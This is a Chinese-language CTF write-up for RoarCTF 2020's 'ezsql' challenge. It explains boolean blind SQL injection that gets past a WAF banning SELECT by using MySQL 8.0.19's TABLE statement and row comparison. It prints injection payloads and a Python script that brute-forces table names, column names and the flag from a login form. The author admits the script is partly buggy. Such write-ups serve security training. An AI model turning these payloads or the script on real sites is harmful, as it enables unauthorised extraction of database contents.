---
title: RoarCTF 2020
date: 2020-12-07
image: 
description:  嘶吼CTF
categories: 
- ctf_writeup
tags:
- SQLi
---
### ezsql
考点：布尔盲注，MySQL_8.0.19新特性`table`语句，无列名盲注

截图截没有了，忘了，简单说下思路：

传统艺能sqli，本来是一个常规的布尔盲注，不过由于waf写的很黑，大小写ban掉了select，导致没有办法跨表查询，只能同表查询或者查库名：

~~~
admin'/**/and/**/ascii(substr(database(),1,1))>32#
//库名ctf
admin'/**/and/**/ascii(substr(password,1,1))>32#
//密码b4bc4c343ed120df3bff56d586e6d617
~~~

本来测出来有堆叠，但是由于waf写的很黑，堆叠也胎死腹中。

注出来密码md5(gml666)==b4bc4c343ed120df3bff56d586e6d617之后，登陆，提示no flag；
由于waf写的很黑，这到题如果MySQL版本不是>=8.0.19的话就是没有方法做的；

我们能够在[官方文档](https://dev.mysql.com/doc/refman/8.0/en/table.html "官方文档")找到以下资料

> The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
> ```sql
> TABLE t;
> 
> SELECT * FROM t;
> ```
> You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)

本地Windows起一个MySQL_8.0.22的环境调试了一下，发现了之前[新春战疫](http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/ "新春战疫")的ezsql的姿势可以用，当时还抄了颖奇师傅的博客。

> 核心payload：(select 'admin','admin')>(select * from users limit 1)

> 假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的strcmp()函数原理一样，举几个例子：
> 
> 1. glag > flag{bbbbb}
2. alag{zzzzzzzzzzz} < flag{bbbbb}
3. a < flag{bbbbb}
4. z > flag{bbbbb}

库名已知，我们需要的就是表名，根据写的很黑的waf，我们其实只有一条路：`information_schema.tables`，这张表结构大概是这样：
![](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116013103.png)

第一列`TABLE_CATALOG`基本都是`def`，少数是`NULL`，第二列是库名，第三列是表名，我们就只需要知道这些，另外的太多了不方便贴。

payload大概长这样：

```
admin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<(table/**/information_schema.tables/**/limit/**/0,1)#
//返回password error!
admin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)>(table/**/information_schema.tables/**/limit/**/0,1)#
//返回,username error!
```
接下来是exp：
```python
#python3
import requests
url = 'http://139.129.98.9:30003/login.php'

def trans(flag):
    res = ''
    for i in flag:
        res += hex(ord(i))
    res = '0x' + res.replace('0x','')
    return res

flag = 'flag{6a55e234-1ed0-455c-bbf3-6df6ddce'
# flag只能跑到这里，后面的一位任意字母真任意非字母假
for i in range(1,500): #这循环一定要大 不然flag长的话跑不完
    hexchar = ''
    for char in range(32, 126):
        hexchar = trans(flag+ chr(char))

        # payload = "admin'/**/and/**/ROW('def','ctf',{},'A',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)" \
        #           ">(table/**/information_schema.tables/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/1,1)#".format(hexchar)
        # #表名admin和f11114g

        # payload = "admin'/**/and/**/ROW('def','ctf','admin',{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)" \
        #           ">(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/2,1)#".format(hexchar)
        # #admin：id,USERNAME,PASSWORD.....打偏了

        # payload = "admin'/**/and/**/ROW('def','ctf','f11114g',{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)" \
        #           ">(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/6,1)#".format(hexchar)
        # #f11114g：F1LLLAGGG只有一列

        payload = "admin'/**/and/**/{}" \
                  ">(table/**/ctf.f11114g/**/limit/**/1,1)#".format(hexchar)
        #这里本来不需要列名的，注列名是为了搞清楚有几列

        data = {
                'username': payload,
                'password': '1'
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
        }

        try:
            r = requests.post(url=url, data=data, proxies=proxies, timeout=2)
        except:
            pass
        print(char, r.text, data['username'])
        if 'password error!"' in r.text:
            flag += chr(char-1)
            print(flag)
            break

```

说明一下，这个exp有点问题，比如flag中的-会跑出来单引号，遇到的时候手动换一下就好，然后就是跑到最后四位的时候会断掉，后面的玄学跑不出来。
赛后和师傅交流说其实flag可以直接用ascii(substr(flag,1,1))>1的方式来做，因为f11114g表里面只有一个字段。

